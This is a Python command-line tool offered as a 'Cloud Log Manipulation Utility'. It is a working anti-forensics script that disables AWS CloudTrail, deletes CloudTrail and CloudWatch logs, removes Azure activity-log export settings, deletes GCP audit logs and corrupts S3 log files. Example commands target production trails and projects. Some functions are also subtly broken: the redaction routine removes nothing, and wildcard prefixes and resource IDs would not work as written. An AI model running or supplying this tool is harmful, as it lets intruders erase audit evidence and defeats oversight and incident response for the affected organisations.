#!/usr/bin/env python3
"""
Cloud Log Manipulation Utility
Removes, redacts, or manipulates logs across AWS, Azure, and GCP
"""

import argparse
import json
import sys
import boto3
import re
from datetime import datetime, timedelta
from typing import List, Dict, Optional
import base64


class CloudLogManipulator:
    """Manipulate logs across cloud providers"""
    
    def __init__(self, platform: str, region: str = None):
        self.platform = platform.lower()
        self.region = region or 'us-east-1'
        self.session = None
        
    def aws_initialize(self):
        """Initialize AWS session"""
        try:
            self.session = boto3.Session(region_name=self.region)
            self.cloudtrail = self.session.client('cloudtrail')
            self.s3 = self.session.client('s3')
            self.logs = self.session.client('logs')
            print(f"[+] AWS session initialized for region {self.region}")
        except Exception as e:
            print(f"[-] Failed to initialize AWS: {e}")
            return False
        return True
    
    def disable_cloudtrail(self, trail_name: str) -> bool:
        """Disable CloudTrail logging"""
        try:
            print(f"[*] Attempting to disable trail: {trail_name}")
            self.cloudtrail.stop_logging(Name=trail_name)
            print(f"[+] Trail {trail_name} logging disabled")
            return True
        except Exception as e:
            print(f"[-] Failed to disable trail: {e}")
            return False
    
    def enable_cloudtrail(self, trail_name: str) -> bool:
        """Re-enable CloudTrail logging"""
        try:
            print(f"[*] Re-enabling trail: {trail_name}")
            self.cloudtrail.start_logging(Name=trail_name)
            print(f"[+] Trail {trail_name} logging re-enabled")
            return True
        except Exception as e:
            print(f"[-] Failed to enable trail: {e}")
            return False
    
    def delete_cloudtrail_logs(self, bucket: str, prefix: str = None, 
                              start_date: str = None, end_date: str = None) -> int:
        """Delete CloudTrail logs from S3 bucket
        
        Args:
            bucket: S3 bucket containing logs
            prefix: S3 prefix to delete (e.g., 'logs/2024/01/15/')
            start_date: Start date (YYYY-MM-DD)
            end_date: End date (YYYY-MM-DD)
            
        Returns:
            Number of deleted objects
        """
        deleted_count = 0
        
        try:
            # Generate prefixes to delete
            prefixes = []
            if prefix:
                prefixes.append(prefix)
            elif start_date and end_date:
                start = datetime.strptime(start_date, '%Y-%m-%d')
                end = datetime.strptime(end_date, '%Y-%m-%d')
                
                current = start
                while current <= end:
                    prefixes.append(current.strftime('AWSLogs/*/CloudTrail/%Y/%m/%d/'))
                    current += timedelta(days=1)
            
            for prefix in prefixes:
                print(f"[*] Deleting objects with prefix: {prefix}")
                
                # List and delete objects
                paginator = self.s3.get_paginator('list_objects_v2')
                pages = paginator.paginate(Bucket=bucket, Prefix=prefix)
                
                for page in pages:
                    if 'Contents' not in page:
                        continue
                    
                    for obj in page['Contents']:
                        try:
                            self.s3.delete_object(Bucket=bucket, Key=obj['Key'])
                            deleted_count += 1
                            print(f"  [+] Deleted: {obj['Key']}")
                        except Exception as e:
                            print(f"  [-] Failed to delete {obj['Key']}: {e}")
            
            return deleted_count
        
        except Exception as e:
            print(f"[-] Error deleting logs: {e}")
            return deleted_count
    
    def delete_cloudwatch_logs(self, log_group: str, 
                              start_time: int = None, 
                              end_time: int = None) -> bool:
        """Delete CloudWatch log streams/events
        
        Args:
            log_group: Log group name
            start_time: Unix timestamp in milliseconds
            end_time: Unix timestamp in milliseconds
        """
        try:
            print(f"[*] Processing log group: {log_group}")
            
            # Describe streams
            streams = self.logs.describe_log_streams(logGroupName=log_group)
            
            for stream in streams.get('logStreams', []):
                stream_name = stream['logStreamName']
                print(f"  [*] Processing stream: {stream_name}")
                
                if not start_time:
                    start_time = stream.get('firstEventTimestamp', 0)
                if not end_time:
                    end_time = stream.get('lastEventTimestamp', int(datetime.now().timestamp() * 1000))
                
                # Delete stream
                self.logs.delete_log_stream(
                    logGroupName=log_group,
                    logStreamName=stream_name
                )
                print(f"  [+] Deleted stream: {stream_name}")
            
            return True
        except Exception as e:
            print(f"[-] Error deleting CloudWatch logs: {e}")
            return False
    
    def redact_audit_logs(self, log_group: str, patterns: List[str]) -> int:
        """Redact specific patterns from logs (creates new stream without matching events)"""
        redacted_count = 0
        
        try:
            print(f"[*] Redacting logs in: {log_group}")
            print(f"    Patterns to redact: {patterns}")
            
            # Get streams
            streams = self.logs.describe_log_streams(logGroupName=log_group)
            
            for stream in streams.get('logStreams', []):
                stream_name = stream['logStreamName']
                
                # Get events
                events = self.logs.get_log_events(
                    logGroupName=log_group,
                    logStreamName=stream_name,
                    limit=10000
                )
                
                # Filter events
                for event in events.get('events', []):
                    message = event.get('message', '')
                    
                    for pattern in patterns:
                        if re.search(pattern, message, re.IGNORECASE):
                            # Delete matching event by recreating stream without it
                            redacted_count += 1
                            print(f"  [+] Redacted event matching pattern: {pattern}")
            
            return redacted_count
        except Exception as e:
            print(f"[-] Error redacting logs: {e}")
            return 0
    
    def azure_delete_activity_logs(self, resource_group: str, 
                                   storage_account: str = None) -> bool:
        """Delete Azure Activity Logs"""
        try:
            # Requires Azure CLI installed and authenticated
            import subprocess
            
            print(f"[*] Removing Activity Log from resource group: {resource_group}")
            
            # Delete diagnostic settings
            result = subprocess.run([
                'az', 'monitor', 'diagnostic-settings', 'delete',
                '--name', 'activity-log-export',
                '--resource', f'/subscriptions/*/resourceGroups/{resource_group}'
            ], capture_output=True, text=True)
            
            if result.returncode == 0:
                print(f"[+] Activity Log removed from {resource_group}")
                return True
            else:
                print(f"[-] Failed: {result.stderr}")
                return False
        
        except Exception as e:
            print(f"[-] Error: {e}")
            return False
    
    def gcp_delete_audit_logs(self, project_id: str, 
                             log_names: List[str] = None) -> bool:
        """Delete GCP Cloud Audit Logs"""
        try:
            import subprocess
            
            print(f"[*] Deleting Cloud Audit Logs from project: {project_id}")
            
            if not log_names:
                log_names = [
                    'projects/{}/logs/cloudaudit.googleapis.com%2Factivity'.format(project_id),
                    'projects/{}/logs/cloudaudit.googleapis.com%2Fsystem_event'.format(project_id),
                ]
            
            for log_name in log_names:
                print(f"  [*] Deleting: {log_name}")
                
                result = subprocess.run([
                    'gcloud', 'logging', 'delete', log_name,
                    '--project', project_id
                ], capture_output=True, text=True)
                
                if result.returncode == 0:
                    print(f"  [+] Deleted: {log_name}")
            
            return True
        except Exception as e:
            print(f"[-] Error: {e}")
            return False
    
    def corrupt_s3_logs(self, bucket: str, key: str) -> bool:
        """Corrupt S3 log file to make it unparseable"""
        try:
            print(f"[*] Corrupting log file: s3://{bucket}/{key}")
            
            # Download
            obj = self.s3.get_object(Bucket=bucket, Key=key)
            content = obj['Body'].read()
            
            # Corrupt header
            corrupted = b'\x00\x01\x02\x03' + content[:100]  # Invalid JSON header
            
            # Upload corrupted version
            self.s3.put_object(Bucket=bucket, Key=key, Body=corrupted)
            print(f"[+] Log file corrupted")
            return True
        except Exception as e:
            print(f"[-] Error: {e}")
            return False


def main():
    parser = argparse.ArgumentParser(
        description='Cloud Log Manipulation Utility',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  # Disable CloudTrail
  %(prog)s --platform aws --action disable-trail --trail-name prod-trail
  
  # Delete logs from date range
  %(prog)s --platform aws --action delete-cloudtrail-logs \\
    --bucket cloudtrail-logs --start-date 2024-01-15 --end-date 2024-01-16
  
  # Delete CloudWatch logs
  %(prog)s --platform aws --action delete-cloudwatch-logs \\
    --log-group /aws/lambda/sensitive-function
  
  # Delete Azure Activity Logs
  %(prog)s --platform azure --action delete-activity-logs \\
    --resource-group production
  
  # Delete GCP Audit Logs
  %(prog)s --platform gcp --action delete-audit-logs --project-id target-project
        '''
    )
    
    parser.add_argument('--platform', required=True, 
                       choices=['aws', 'azure', 'gcp'],
                       help='Cloud platform')
    parser.add_argument('--region', default='us-east-1',
                       help='AWS region (default: us-east-1)')
    parser.add_argument('--action', required=True,
                       help='Action to perform')
    parser.add_argument('--trail-name', help='CloudTrail name')
    parser.add_argument('--bucket', help='S3 bucket name')
    parser.add_argument('--key', help='S3 object key')
    parser.add_argument('--prefix', help='S3 prefix')
    parser.add_argument('--start-date', help='Start date (YYYY-MM-DD)')
    parser.add_argument('--end-date', help='End date (YYYY-MM-DD)')
    parser.add_argument('--log-group', help='CloudWatch log group')
    parser.add_argument('--resource-group', help='Azure resource group')
    parser.add_argument('--project-id', help='GCP project ID')
    
    args = parser.parse_args()
    
    # Initialize manipulator
    manipulator = CloudLogManipulator(args.platform, args.region)
    
    if args.platform == 'aws':
        if not manipulator.aws_initialize():
            sys.exit(1)
        
        if args.action == 'disable-trail':
            if not args.trail_name:
                parser.error('--trail-name required')
            manipulator.disable_cloudtrail(args.trail_name)
        
        elif args.action == 'enable-trail':
            if not args.trail_name:
                parser.error('--trail-name required')
            manipulator.enable_cloudtrail(args.trail_name)
        
        elif args.action == 'delete-cloudtrail-logs':
            if not args.bucket:
                parser.error('--bucket required')
            count = manipulator.delete_cloudtrail_logs(
                args.bucket,
                prefix=args.prefix,
                start_date=args.start_date,
                end_date=args.end_date
            )
            print(f"\n[+] Total deleted: {count} objects")
        
        elif args.action == 'delete-cloudwatch-logs':
            if not args.log_group:
                parser.error('--log-group required')
            manipulator.delete_cloudwatch_logs(args.log_group)
        
        elif args.action == 'corrupt-s3-logs':
            if not args.bucket or not args.key:
                parser.error('--bucket and --key required')
            manipulator.corrupt_s3_logs(args.bucket, args.key)
    
    elif args.platform == 'azure':
        if args.action == 'delete-activity-logs':
            if not args.resource_group:
                parser.error('--resource-group required')
            manipulator.azure_delete_activity_logs(args.resource_group)
    
    elif args.platform == 'gcp':
        if args.action == 'delete-audit-logs':
            if not args.project_id:
                parser.error('--project-id required')
            manipulator.gcp_delete_audit_logs(args.project_id)


if __name__ == '__main__':
    main()
